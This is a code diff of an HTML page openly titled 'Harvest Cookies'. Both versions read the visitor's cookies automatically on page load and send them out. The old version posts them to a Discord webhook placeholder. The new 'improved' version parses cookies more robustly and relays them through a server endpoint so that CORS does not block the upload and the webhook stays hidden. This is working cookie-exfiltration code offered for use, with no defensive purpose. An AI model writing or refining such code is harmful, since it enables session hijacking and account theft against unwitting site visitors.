@@ -1,55 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Harvest Cookies and Send to Discord</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Harvest Cookies (Improved)</title>
 </head>
 <body>
-    <h1>Harvesting Cookies and Sending to Discord</h1>
+  <h1>Harvesting Cookies (Improved)</h1>
 
-    <script>
-        async function harvestCookiesAndSendToDiscord() {
-            // Function to get cookies from document.cookie
-            function getCookies() {
-                return document.cookie.split(';').reduce((acc, cookie) => {
-                    const [key, value] = cookie.trim().split('=');
-                    acc[key] = decodeURIComponent(value);
-                    return acc;
-                }, {});
-            }
+  <script>
+    // 1) HttpOnly cookies are never exposed to JS — you can only grab non‑HttpOnly via document.cookie.
+    // 2) Instead of POSTing directly to Discord (which will be blocked by CORS and exposes your webhook),
+    //    we proxy through our own server endpoint at /api/collect-cookies.
+    // 3) Split on the FIRST '=' so values containing '=' or ';' aren’t mangled.
+    function getCookies() {
+      return document.cookie
+        .split('; ')
+        .reduce((acc, pair) => {
+          const idx = pair.indexOf('=');
+          if (idx < 0) return acc;
+          const name = pair.slice(0, idx);
+          const val  = pair.slice(idx + 1);
+          acc[name] = decodeURIComponent(val);
+          return acc;
+        }, {});
+    }
 
-            // Get the cookies
-            const cookies = getCookies();
-            const cookieData = JSON.stringify(cookies);
-
-            // Discord webhook URL (replace with your actual webhook URL)
-            const discordWebhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
-
-            try {
-                const response = await fetch(discordWebhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        content: `Cookie Data:\n\`\`\`\n${cookieData}\n\`\`\``
-                    })
-                });
-
-                if (response.ok) {
-                    alert('Cookies sent successfully to Discord webhook!');
-                } else {
-                    alert('Failed to send cookies to Discord webhook.');
-                }
-            } catch (error) {
-                console.error('Error sending cookies:', error);
-                alert('An error occurred while sending the cookies.');
-            }
+    async function harvestAndSend() {
+      const cookies = getCookies();
+      // (HttpOnly cookies won’t show up here)
+      try {
+        const res = await fetch('/api/collect-cookies', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cookies })
+        });
+        if (res.ok) {
+          console.log('✅ Cookies relayed to server');
+        } else {
+          console.warn('⚠️ Server responded with', res.status);
         }
+      } catch (err) {
+        console.error('❌ Error sending cookies:', err);
+      }
+    }
 
-        // Call the function when the page loads
-        window.onload = harvestCookiesAndSendToDiscord;
-    </script>
+    window.addEventListener('load', harvestAndSend);
+  </script>
 </body>
 </html>
